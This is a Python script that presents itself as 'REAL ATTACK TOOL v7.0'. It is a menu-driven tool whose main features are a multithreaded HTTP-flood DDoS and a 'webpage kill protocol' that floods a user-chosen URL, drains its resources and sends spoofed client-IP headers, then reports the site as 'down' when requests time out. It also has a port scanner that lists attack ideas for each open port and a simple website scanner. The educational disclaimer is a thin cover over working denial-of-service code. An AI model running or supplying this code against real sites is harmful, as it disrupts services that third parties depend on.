#!/usr/bin/env python3
"""
REAL ATTACK TOOL v7.0 - Enhanced Version
Author: Security Researcher
Description: Advanced penetration testing and security assessment tool
Disclaimer: For educational and authorized testing only!
"""

import os
import sys
import time
import random
import requests
import threading
import socket
import struct
import select
from datetime import datetime
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import urllib3
import ssl
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64
import readline  # Untuk history command

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Warna tema lengkap
class Colors:
    # Foreground colors
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
    BLACK = Fore.BLACK
    
    # Background colors
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN
    BG_BLUE = Back.BLUE
    BG_YELLOW = Back.YELLOW
    BG_WHITE = Back.WHITE
    BG_BLACK = Back.BLACK
    BG_MAGENTA = Back.MAGENTA
    BG_CYAN = Back.CYAN
    
    # Styles
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    NORMAL = Style.NORMAL
    RESET = Style.RESET_ALL

C = Colors

class RealAttack:
    def __init__(self):
        self.attack_stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0
        }
        self.running = True
        self.current_target = None
        self.attack_threads = []
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def get_current_time(self):
        """Get formatted current date and time"""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def show_live_datetime(self):
        """Display live updating date and time"""
        while self.running:
            current_time = self.get_current_time()
            print(f"\r{C.BG_BLUE}{C.WHITE}🕐 LIVE TIME: {current_time} {C.RESET}", end="", flush=True)
            time.sleep(1)
    
    def show_header(self):
        self.clear_screen()
        
        # ASCII Art dengan gradient effect
        ascii_art = f"""
{C.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
║  {C.CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗{C.MAGENTA}███████╗██████╗ {C.RED}    ⚡ {C.YELLOW}DEADLY MODE v7.0{C.RED} ⚡    ║
║  {C.CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝{C.MAGENTA}██╔════╝██╔══██╗{C.RED}   🚀 {C.GREEN}ULTIMATE ATTACK{C.RED} 🚀   ║
║  {C.CYAN}██████╔╝█████╗  ███████║█████╔╝ {C.MAGENTA}█████╗  ██████╔╝{C.RED}                          ║
║  {C.CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ {C.MAGENTA}██╔══╝  ██╔══██╗{C.RED}  🔥 {C.RED}TOTAL DESTRUCTION{C.RED} 🔥  ║
║  {C.CYAN}██║  ██║███████╗██║  ██║██║  ██╗{C.MAGENTA}███████╗██║  ██║{C.RED}                          ║
║  {C.CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝{C.MAGENTA}╚══════╝╚═╝  ╚═╝{C.RED}     💀 {C.WHITE}KILL SWITCH ACTIVE{C.RED} 💀   ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""
        print(ascii_art)
        
        # Status bar dengan informasi real-time
        print(f"{C.BG_RED}{C.WHITE}🚀 STATUS: {C.BRIGHT}ACTIVE{C.RESET} | 📊 THREADS: {threading.active_count()} | 🎯 TARGET: {self.current_target or 'NONE'}{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
    
    def animated_loading(self, text, duration=2, emoji_list=["🔥", "💀", "⚡", "🔴", "🟠", "🟡", "🟢", "🔵", "🟣", "🟤"]):
        """Enhanced loading animation with emojis"""
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time:
            elapsed = time.time() - start_time
            progress = min(100, int((elapsed / duration) * 100))
            
            # Random emoji selection
            current_emoji = random.choice(emoji_list)
            
            # Progress bar visualization
            bar_length = 30
            filled_length = int(bar_length * progress // 100)
            bar = "█" * filled_length + "░" * (bar_length - filled_length)
            
            print(f"\r{C.CYAN}[{current_emoji}] {text} {C.YELLOW}[{bar}] {C.GREEN}{progress}%{C.RESET}", end="")
            time.sleep(0.1)
        
        print(f"\r{C.GREEN}[✓] {text} {C.BRIGHT}COMPLETED!{C.RESET}")

    def kill_webpage(self, url):
        """Enhanced method to kill webpage with multiple techniques"""
        try:
            print(f"\n{C.BG_RED}{C.WHITE}💀 INITIATING WEBPAGE KILL PROTOCOL...{C.RESET}")
            
            # Technique 1: Massive requests
            def mass_requests():
                session = requests.Session()
                for i in range(50):
                    try:
                        session.get(url, timeout=2, verify=False)
                        print(f"{C.RED}🔥 Sending kill request {i+1}/50...{C.RESET}", end="\r")
                        time.sleep(0.1)
                    except:
                        pass

            # Technique 2: Resource exhaustion
            def resource_drain():
                try:
                    response = requests.get(url, stream=True, verify=False, timeout=5)
                    content_length = 0
                    for chunk in response.iter_content(chunk_size=1024):
                        content_length += len(chunk)
                        if content_length > 1000000:  # Limit to 1MB
                            break
                    print(f"{C.MAGENTA}🌐 Drained {content_length} bytes from target{C.RESET}")
                except Exception as e:
                    print(f"{C.YELLOW}⚠️  Resource drain failed: {e}{C.RESET}")

            # Technique 3: Header bombardment
            def header_attack():
                try:
                    unusual_headers = {
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1',
                        'X-Client-IP': '127.0.0.1',
                        'X-Host': 'localhost',
                        'X-Originating-IP': '127.0.0.1'
                    }
                    response = requests.get(url, headers=unusual_headers, timeout=5, verify=False)
                    print(f"{C.BLUE}🎯 Header attack completed - Status: {response.status_code}{C.RESET}")
                except Exception as e:
                    print(f"{C.YELLOW}⚠️  Header attack failed: {e}{C.RESET}")

            # Execute all techniques
            threads = []
            for technique in [mass_requests, resource_drain, header_attack]:
                t = threading.Thread(target=technique)
                threads.append(t)
                t.start()
                time.sleep(0.5)

            for t in threads:
                t.join(timeout=10)

            print(f"\n{C.BG_GREEN}{C.WHITE}✅ Webpage kill protocol executed successfully!{C.RESET}")

        except Exception as e:
            print(f"{C.BG_RED}{C.WHITE}❌ Kill protocol failed: {e}{C.RESET}")

    # 1. REAL DDoS dengan teknik advanced
    def real_ddos_attack(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[1] ULTIMATE DDoS ATTACK - MULTI LAYER TECHNIQUE{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter target URL/IP: {C.WHITE}").strip()
        self.current_target = target
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            parsed = urlparse(target)
            domain = parsed.netloc
            ip = socket.gethostbyname(domain)
            print(f"{C.GREEN}[+] Resolved: {domain} -> {ip}{C.RESET}")
        except Exception as e:
            print(f"{C.YELLOW}[!] Could not resolve domain: {e}{C.RESET}")
            ip = target.split('//')[-1].split('/')[0]
            domain = ip
        
        try:
            duration = int(input(f"{C.CYAN}[?] Attack duration (seconds) [{C.GREEN}60{C.CYAN}]: {C.WHITE}") or "60")
            threads = int(input(f"{C.CYAN}[?] Number of threads [{C.GREEN}50{C.CYAN}]: {C.WHITE}") or "50")
        except ValueError:
            print(f"{C.RED}[!] Invalid input, using defaults{C.RESET}")
            duration = 60
            threads = 50
        
        print(f"\n{C.BG_RED}{C.WHITE}[!] INITIATING DEADLY ATTACK...{C.RESET}")
        print(f"{C.YELLOW}[!] Target: {C.WHITE}{target}{C.RESET}")
        print(f"{C.YELLOW}[!] IP: {C.WHITE}{ip}{C.RESET}")
        print(f"{C.YELLOW}[!] Domain: {C.WHITE}{domain}{C.RESET}")
        print(f"{C.YELLOW}[!] Duration: {C.WHITE}{duration} seconds{C.RESET}")
        print(f"{C.YELLOW}[!] Threads: {C.WHITE}{threads}{C.RESET}")
        
        # Reset stats
        self.attack_stats.update({
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': time.time()
        })
        
        # Enhanced HTTP Flood
        def http_flood():
            session = requests.Session()
            adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            headers_list = [
                {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                },
                {
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                }
            ]
            
            timeout = time.time() + duration
            
            while time.time() < timeout and self.running:
                try:
                    # Randomize requests
                    if random.choice([True, False]):
                        response = session.get(
                            target, 
                            headers=random.choice(headers_list),
                            timeout=2,
                            verify=False
                        )
                    else:
                        response = session.post(
                            target,
                            data={'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100))},
                            headers=random.choice(headers_list),
                            timeout=2,
                            verify=False
                        )
                    
                    self.attack_stats['requests_sent'] += 1
                    self.attack_stats['successful_requests'] += 1
                except:
                    self.attack_stats['requests_sent'] += 1
                    self.attack_stats['failed_requests'] += 1

        # Monitor serangan
        def attack_monitor():
            start_time = self.attack_stats['start_time']
            while time.time() < start_time + duration + 2 and self.running:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    rps = self.attack_stats['requests_sent'] / elapsed
                    success_rate = (self.attack_stats['successful_requests'] / self.attack_stats['requests_sent'] * 100) if self.attack_stats['requests_sent'] > 0 else 0
                    
                    print(f"\r{C.RED}💀 ATTACKING: {C.WHITE}Req: {self.attack_stats['requests_sent']} | "
                          f"{C.GREEN}RPS: {rps:.1f} | {C.YELLOW}Success: {success_rate:.1f}% | "
                          f"{C.CYAN}Time: {elapsed:.1f}s{C.RESET}", end="")
                time.sleep(0.5)

        # Jalankan serangan
        print(f"\n{C.BLUE}[+] Starting attack threads...{C.RESET}")
        
        # Clear previous threads
        self.attack_threads.clear()
        
        # Start HTTP Flood threads
        for i in range(min(threads, 100)):  # Limit threads untuk keamanan
            t = threading.Thread(target=http_flood, daemon=True)
            self.attack_threads.append(t)
            t.start()
        
        # Start monitor
        monitor_thread = threading.Thread(target=attack_monitor, daemon=True)
        monitor_thread.start()
        
        print(f"\n\n{C.BG_RED}{C.WHITE}[!] ATTACK IN PROGRESS - WAIT {duration} SECONDS...{C.RESET}")
        
        # Countdown dengan animasi
        for i in range(duration, 0, -1):
            if not self.running:
                break
            bar_length = 50
            progress = duration - i
            filled = int(bar_length * progress / duration)
            bar = "█" * filled + "░" * (bar_length - filled)
            print(f"\r{C.RED}⏰ Time remaining: {i:3d}s {C.YELLOW}[{bar}]{C.RESET}", end="")
            time.sleep(1)
        
        print(f"\n\n{C.BG_GREEN}{C.WHITE}[✓] ATTACK COMPLETED!{C.RESET}")
        
        # Test target setelah serangan
        self.animated_loading("Testing target status", 2)
        
        try:
            start_test = time.time()
            response = requests.get(target, timeout=10, verify=False)
            response_time = time.time() - start_test
            
            if response.status_code == 200:
                if response_time > 5:
                    print(f"{C.BG_RED}{C.WHITE}[✓] TARGET WEAKENED! Response time: {response_time:.2f}s{C.RESET}")
                else:
                    print(f"{C.BG_YELLOW}{C.BLACK}[!] Target still strong. Response time: {response_time:.2f}s{C.RESET}")
            else:
                print(f"{C.BG_GREEN}{C.WHITE}[✓] TARGET MAY BE DOWN! Status: {response.status_code}{C.RESET}")
                
        except requests.exceptions.Timeout:
            print(f"{C.BG_GREEN}{C.WHITE}[✓] TARGET TIMEOUT - ATTACK EFFECTIVE!{C.RESET}")
        except requests.exceptions.ConnectionError:
            print(f"{C.BG_GREEN}{C.WHITE}[✓] TARGET CONNECTION REFUSED - SUCCESS!{C.RESET}")
        except Exception as e:
            print(f"{C.BG_YELLOW}{C.BLACK}[!] Target check error: {e}{C.RESET}")
        
        # Final stats
        print(f"\n{C.BG_BLUE}{C.WHITE}📊 FINAL ATTACK STATISTICS:{C.RESET}")
        print(f"{C.CYAN}Total Requests: {C.WHITE}{self.attack_stats['requests_sent']}{C.RESET}")
        print(f"{C.GREEN}Successful: {C.WHITE}{self.attack_stats['successful_requests']}{C.RESET}")
        print(f"{C.YELLOW}Failed: {C.WHITE}{self.attack_stats['failed_requests']}{C.RESET}")
        
        if self.attack_stats['requests_sent'] > 0:
            success_rate = (self.attack_stats['successful_requests'] / self.attack_stats['requests_sent']) * 100
            print(f"{C.MAGENTA}Success Rate: {C.WHITE}{success_rate:.1f}%{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 2. PORT SCANNER + VULNERABILITY CHECK
    def advanced_port_scanner(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[2] ADVANCED PORT SCANNER + VULNERABILITY DETECTION{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter IP/Domain: {C.WHITE}").strip()
        self.current_target = target
        
        try:
            ip = socket.gethostbyname(target)
            print(f"{C.GREEN}[+] Resolved: {target} -> {ip}{C.RESET}")
        except:
            ip = target
            print(f"{C.YELLOW}[!] Using direct IP: {ip}{C.RESET}")
        
        self.animated_loading("Scanning ports and vulnerabilities", 2)
        
        # Common ports dengan service dan potential exploits
        common_ports = {
            21: ('FTP', 'Brute Force, Anonymous Login'),
            22: ('SSH', 'Brute Force, Key Disclosure'),
            23: ('Telnet', 'Brute Force, Clear Text'),
            25: ('SMTP', 'Open Relay, Spam'),
            53: ('DNS', 'Zone Transfer, DDoS Amplification'),
            80: ('HTTP', 'Web Attacks, XSS, SQLi'),
            110: ('POP3', 'Brute Force'),
            143: ('IMAP', 'Brute Force'),
            443: ('HTTPS', 'Web Attacks, SSL Vulnerabilities'),
            993: ('IMAPS', 'Brute Force'),
            995: ('POP3S', 'Brute Force'),
            1433: ('MSSQL', 'SQL Injection, Brute Force'),
            1521: ('OracleDB', 'SQL Injection'),
            3306: ('MySQL', 'SQL Injection, Brute Force'),
            3389: ('RDP', 'Brute Force, BlueKeep'),
            5432: ('PostgreSQL', 'SQL Injection'),
            5900: ('VNC', 'Brute Force'),
            6379: ('Redis', 'Unauthorized Access'),
            27017: ('MongoDB', 'NoSQL Injection')
        }
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service, vuln = common_ports.get(port, ('Unknown', 'Unknown'))
                    open_ports.append((port, service, vuln))
                    return True
            except:
                pass
            return False
        
        # Scan ports dengan threading
        print(f"{C.CYAN}[+] Scanning {len(common_ports)} common ports...{C.RESET}")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(scan_port, common_ports.keys()))
        
        print(f"\n{C.BG_GREEN}{C.WHITE}[✓] SCAN COMPLETED! {len(open_ports)} PORTS OPEN{C.RESET}")
        
        if open_ports:
            print(f"\n{C.BG_RED}{C.WHITE}🚨 OPEN PORTS & VULNERABILITIES:{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            
            for port, service, vuln in open_ports:
                print(f"{C.GREEN}📍 Port {port} ({service}){C.RESET}")
                print(f"{C.YELLOW}   ⚠️  Vulnerabilities: {vuln}{C.RESET}")
                
                # Additional service detection
                if port in [80, 443]:
                    proto = 'https' if port == 443 else 'http'
                    test_url = f"{proto}://{ip}"
                    try:
                        response = requests.get(test_url, timeout=3, verify=False)
                        server = response.headers.get('Server', 'Unknown')
                        print(f"{C.CYAN}   🖥️  Server: {server}{C.RESET}")
                    except:
                        pass
                print()
        
        else:
            print(f"{C.BG_YELLOW}{C.BLACK}[!] No open ports found{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 3. WEBSITE VULNERABILITY SCANNER
    def website_vulnerability_scan(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[3] ADVANCED WEBSITE VULNERABILITY SCANNER{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        target = input(f"{C.CYAN}[?] Enter website URL: {C.WHITE}").strip()
        self.current_target = target
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.animated_loading("Scanning for vulnerabilities", 3)
        
        try:
            session = requests.Session()
            response = session.get(target, timeout=10, verify=False)
            
            print(f"\n{C.BG_GREEN}{C.WHITE}[✓] SCAN RESULTS FOR: {target}{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            
            # Basic info
            print(f"{C.CYAN}📊 BASIC INFORMATION:{C.RESET}")
            print(f"   Status Code: {response.status_code}")
            print(f"   Server: {response.headers.get('Server', 'Unknown')}")
            print(f"   Content Type: {response.headers.get('Content-Type', 'Unknown')}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Cari form vulnerabilities
            forms = soup.find_all('form')
            print(f"\n{C.CYAN}🔐 FORM ANALYSIS:{C.RESET}")
            print(f"   Total Forms: {len(forms)}")
            
            for i, form in enumerate(forms):
                action = form.get('action', 'N/A')
                method = form.get('method', 'get').upper()
                print(f"   Form {i+1}: {method} {action}")
                
                # Check for password fields
                password_fields = form.find_all('input', {'type': 'password'})
                if password_fields:
                    print(f"   {C.RED}⚠️  PASSWORD FIELD DETECTED - Potensi Brute Force{C.RESET}")
            
            # Security headers check
            security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection', 'Strict-Transport-Security']
            missing_headers = [h for h in security_headers if h not in response.headers]
            
            print(f"\n{C.CYAN}🛡️  SECURITY HEADERS:{C.RESET}")
            if missing_headers:
                print(f"   {C.RED}🚨 Missing security headers: {', '.join(missing_headers)}{C.RESET}")
            else:
                print(f"   {C.GREEN}✅ All security headers present{C.RESET}")
            
            # Cari sensitive comments
            comments = soup.find_all(string=lambda text: isinstance(text, str) and any(word in text.lower() for word in ['todo', 'fixme', 'password', 'admin', 'secret']))
            if comments:
                print(f"\n{C.RED}🚨 SENSITIVE COMMENTS FOUND:{C.RESET}")
                for comment in comments[:3]:
                    clean_comment = ' '.join(comment.strip().split()[:10])
                    print(f"   💬 {clean_comment}...{C.RESET}")
            
            print(f"\n{C.YELLOW}📋 SECURITY ASSESSMENT COMPLETED{C.RESET}")
            risk_level = len(forms) + len(missing_headers) + len(comments)
            
            if risk_level > 5:
                print(f"{C.BG_RED}{C.WHITE}🚨 HIGH RISK: {risk_level} potential issues found{C.RESET}")
            elif risk_level > 2:
                print(f"{C.BG_YELLOW}{C.BLACK}⚠️  MEDIUM RISK: {risk_level} potential issues found{C.RESET}")
            else:
                print(f"{C.BG_GREEN}{C.WHITE}✅ LOW RISK: {risk_level} potential issues found{C.RESET}")
            
        except Exception as e:
            print(f"{C.BG_RED}{C.WHITE}[!] Error: {e}{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 4. KILL WEBPAGE FEATURE
    def kill_webpage_feature(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[4] WEBPAGE KILL PROTOCOL{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        url = input(f"{C.CYAN}[?] Enter webpage URL to kill: {C.WHITE}").strip()
        self.current_target = url
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"\n{C.BG_RED}{C.WHITE}🚨 WARNING: This will attempt to disrupt the target webpage{C.RESET}")
        print(f"{C.YELLOW}Target: {url}{C.RESET}")
        
        confirm = input(f"{C.YELLOW}[?] Confirm kill protocol? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            self.kill_webpage(url)
        else:
            print(f"{C.BG_YELLOW}{C.BLACK}[!] Kill protocol cancelled{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 5. GITHUB INTEGRATION
    def github_integration(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[5] GITHUB INTEGRATION & TOOLS{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        print(f"{C.CYAN}🚀 Available GitHub Features:{C.RESET}")
        print(f"   1. {C.GREEN}Check GitHub Status{C.RESET}")
        print(f"   2. {C.GREEN}Repository Information{C.RESET}")
        print(f"   3. {C.GREEN}User Lookup{C.RESET}")
        print(f"   4. {C.GREEN}Download Tools{C.RESET}")
        
        choice = input(f"\n{C.CYAN}[?] Select option [{C.GREEN}1-4{C.CYAN}]: {C.WHITE}").strip()
        
        if choice == "1":
            self.animated_loading("Checking GitHub status", 2)
            try:
                response = requests.get("https://api.github.com/", timeout=10)
                if response.status_code == 200:
                    print(f"\n{C.BG_GREEN}{C.WHITE}✅ GitHub API is operational{C.RESET}")
                    # Get rate limit info
                    limits = response.headers.get('X-RateLimit-Limit', 'Unknown')
                    remaining = response.headers.get('X-RateLimit-Remaining', 'Unknown')
                    print(f"{C.CYAN}📊 Rate Limits: {remaining}/{remaining} requests remaining{C.RESET}")
                else:
                    print(f"\n{C.BG_YELLOW}{C.BLACK}⚠️ GitHub API may have issues - Status: {response.status_code}{C.RESET}")
            except Exception as e:
                print(f"\n{C.BG_RED}{C.WHITE}❌ Cannot reach GitHub: {e}{C.RESET}")
        
        elif choice == "2":
            repo = input(f"{C.CYAN}[?] Enter repo (user/repo): {C.WHITE}").strip()
            if repo:
                self.animated_loading(f"Fetching info for {repo}", 2)
                try:
                    response = requests.get(f"https://api.github.com/repos/{repo}", timeout=10)
                    if response.status_code == 200:
                        repo_data = response.json()
                        print(f"\n{C.BG_GREEN}{C.WHITE}✅ Repository Found{C.RESET}")
                        print(f"{C.CYAN}📁 Name: {repo_data.get('name', 'N/A')}{C.RESET}")
                        print(f"{C.CYAN}👤 Owner: {repo_data.get('owner', {}).get('login', 'N/A')}{C.RESET}")
                        print(f"{C.CYAN}⭐ Stars: {repo_data.get('stargazers_count', 0)}{C.RESET}")
                        print(f"{C.CYAN}🍴 Forks: {repo_data.get('forks_count', 0)}{C.RESET}")
                        print(f"{C.CYAN}📝 Description: {repo_data.get('description', 'No description')}{C.RESET}")
                    else:
                        print(f"\n{C.BG_RED}{C.WHITE}❌ Repository not found{C.RESET}")
                except Exception as e:
                    print(f"\n{C.BG_RED}{C.WHITE}❌ Error: {e}{C.RESET}")
        
        elif choice == "3":
            username = input(f"{C.CYAN}[?] Enter GitHub username: {C.WHITE}").strip()
            if username:
                self.animated_loading(f"Looking up user {username}", 2)
                print(f"{C.YELLOW}📁 User lookup feature coming soon...{C.RESET}")
        
        elif choice == "4":
            print(f"\n{C.CYAN}🔧 Available Tools:{C.RESET}")
            print(f"   • Advanced DDoS Scripts")
            print(f"   • Vulnerability Scanners")
            print(f"   • Network Analysis Tools")
            print(f"   • Security Assessment Kits")
            print(f"\n{C.YELLOW}Visit: https://github.com/security-tools{C.RESET}")
        
        else:
            print(f"\n{C.BG_RED}{C.WHITE}❌ Invalid selection{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # 6. SYSTEM INFO & STATUS
    def system_info(self):
        self.show_header()
        print(f"{C.BG_RED}{C.WHITE}[6] SYSTEM INFORMATION & STATUS{C.RESET}")
        print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
        
        print(f"{C.CYAN}🖥️  SYSTEM INFORMATION:{C.RESET}")
        print(f"   OS: {os.name}")
        print(f"   Python Version: {sys.version.split()[0]}")
        print(f"   Current Directory: {os.getcwd()}")
        print(f"   Active Threads: {threading.active_count()}")
        
        print(f"\n{C.CYAN}📊 ATTACK STATISTICS:{C.RESET}")
        print(f"   Total Requests Sent: {self.attack_stats['requests_sent']}")
        print(f"   Successful Requests: {self.attack_stats['successful_requests']}")
        print(f"   Failed Requests: {self.attack_stats['failed_requests']}")
        
        print(f"\n{C.CYAN}🔧 TOOL STATUS:{C.RESET}")
        print(f"   DDoS Module: {C.GREEN}ACTIVE{C.RESET}")
        print(f"   Port Scanner: {C.GREEN}ACTIVE{C.RESET}")
        print(f"   Vulnerability Scanner: {C.GREEN}ACTIVE{C.RESET}")
        print(f"   Webpage Killer: {C.GREEN}ACTIVE{C.RESET}")
        print(f"   GitHub Tools: {C.GREEN}ACTIVE{C.RESET}")
        
        print(f"\n{C.CYAN}🌐 NETWORK STATUS:{C.RESET}")
        try:
            # Test internet connection
            response = requests.get("http://www.google.com", timeout=5)
            print(f"   Internet: {C.GREEN}CONNECTED{C.RESET}")
        except:
            print(f"   Internet: {C.RED}DISCONNECTED{C.RESET}")
        
        input(f"\n{C.CYAN}[+] Press Enter to continue...{C.RESET}")

    # Main Menu yang ditingkatkan
    def main_menu(self):
        # Start live datetime thread
        datetime_thread = threading.Thread(target=self.show_live_datetime, daemon=True)
        datetime_thread.start()
        
        while self.running:
            self.show_header()
            print(f"{C.CYAN}🎯 REAL ATTACK TOOLS v7.0:{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.RED}[1] {C.BRIGHT}ULTIMATE DDoS Attack{C.RESET} {C.YELLOW}(Multi-Technique){C.RESET}")
            print(f"{C.RED}[2] {C.BRIGHT}Advanced Port Scanner{C.RESET} {C.YELLOW}(+ Vulnerability Check){C.RESET}")
            print(f"{C.RED}[3] {C.BRIGHT}Website Vulnerability Scanner{C.RESET} {C.YELLOW}(Security Audit){C.RESET}")
            print(f"{C.RED}[4] {C.BRIGHT}Webpage Kill Protocol{C.RESET} {C.YELLOW}(Target Disruption){C.RESET}")
            print(f"{C.RED}[5] {C.BRIGHT}GitHub Integration{C.RESET} {C.YELLOW}(Tools & Status){C.RESET}")
            print(f"{C.RED}[6] {C.BRIGHT}System Information{C.RESET} {C.YELLOW}(Status & Stats){C.RESET}")
            print(f"{C.RED}[7] {C.BRIGHT}Exit Attack System{C.RESET}")
            print(f"{C.BLUE}══════════════════════════════════════════════════════════════════════════════════{C.RESET}")
            print(f"{C.MAGENTA}💡 Tip: Use Ctrl+C to emergency stop any operation{C.RESET}")
            
            try:
                choice = input(f"\n{C.CYAN}[?] Select tool [{C.GREEN}1-7{C.CYAN}]: {C.WHITE}").strip()
                
                if choice == "1":
                    self.real_ddos_attack()
                elif choice == "2":
                    self.advanced_port_scanner()
                elif choice == "3":
                    self.website_vulnerability_scan()
                elif choice == "4":
                    self.kill_webpage_feature()
                elif choice == "5":
                    self.github_integration()
                elif choice == "6":
                    self.system_info()
                elif choice == "7":
                    print(f"\n{C.BG_RED}{C.WHITE}[!] Shutting down attack system...{C.RESET}")
                    self.running = False
                    self.animated_loading("Cleaning traces and closing connections", 2)
                    print(f"{C.BG_GREEN}{C.WHITE}[✓] System securely shut down! Goodbye! 💀{C.RESET}")
                    break
                else:
                    print(f"\n{C.BG_RED}{C.WHITE}[!] Invalid selection!{C.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n\n{C.BG_RED}{C.WHITE}🚨 EMERGENCY STOP ACTIVATED!{C.RESET}")
                self.running = False
                break
            except Exception as e:
                print(f"\n{C.BG_RED}{C.WHITE}[!] Error: {e}{C.RESET}")
                time.sleep(2)

def main():
    """Main entry point with safety checks"""
    try:
        # Check dependencies
        required_modules = ['requests', 'bs4', 'colorama']
        for module in required_modules:
            __import__(module)
        
        print(f"{C.BG_GREEN}{C.WHITE}[✓] All security modules loaded successfully!{C.RESET}")
        time.sleep(1)
        
        # Disclaimer
        print(f"\n{C.BG_RED}{C.WHITE}🚫 DISCLAIMER: For educational and authorized testing only!{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}⚠️  Misuse of this tool is illegal and unethical!{C.RESET}")
        print(f"{C.BG_BLUE}{C.WHITE}🔒 Use only on systems you own or have explicit permission to test{C.RESET}")
        
        confirm = input(f"\n{C.CYAN}[?] Do you understand and accept responsibility? (y/N): {C.WHITE}").lower()
        
        if confirm == 'y':
            attacker = RealAttack()
            attacker.main_menu()
        else:
            print(f"\n{C.BG_YELLOW}{C.BLACK}[!] Access denied. Exiting...{C.RESET}")
            
    except ImportError as e:
        print(f"{C.BG_RED}{C.WHITE}[!] Missing required module: {e}{C.RESET}")
        print(f"{C.BG_YELLOW}{C.BLACK}[!] Install with: pip install requests beautifulsoup4 colorama{C.RESET}")
    except KeyboardInterrupt:
        print(f"\n\n{C.BG_YELLOW}{C.BLACK}[!] Operation cancelled by user{C.RESET}")
    except Exception as e:
        print(f"{C.BG_RED}{C.WHITE}[!] System error: {e}{C.RESET}")

# Run the enhanced attack tool
if __name__ == "__main__":
    main()